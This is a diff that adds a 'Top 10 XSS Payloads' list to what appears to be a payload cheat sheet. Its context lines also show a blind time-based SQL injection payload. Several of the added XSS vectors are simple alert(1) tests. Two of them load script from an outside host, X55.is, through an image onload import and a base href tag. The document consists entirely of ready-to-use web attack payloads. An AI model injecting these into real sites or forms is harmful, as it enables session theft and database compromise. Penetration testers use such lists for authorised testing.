@@ -75,3 +75,17 @@ Persistent XSS in the Signup Process:
 SQLi Blind Time Base:
 xss' AND (SELECT 8091 FROM (SELECT(SLEEP(5)))sRDf) AND 'wRgw'='wRgw
 XOR(if(now()=sysdate(),sleep(5),0))XOR
+
+Top 10 XSS Payloads:
+--------------------
+<Img Src=//X55.is OnLoad=import(src)>
+<Svg OnLoad=alert(1)>
+“AutoFocus OnFocus=alert(1)//
+<K ContentEditable AutoFocus OnFocus=alert(1)>
+<Script>alert(1)</Script>
+‘-alert(1)-’
+JavaScript:alert(1)
+\’/alert(1)//
+<K OnPointerRawUpdate=alert(1)>
+<Base Href=//X55.is>
+
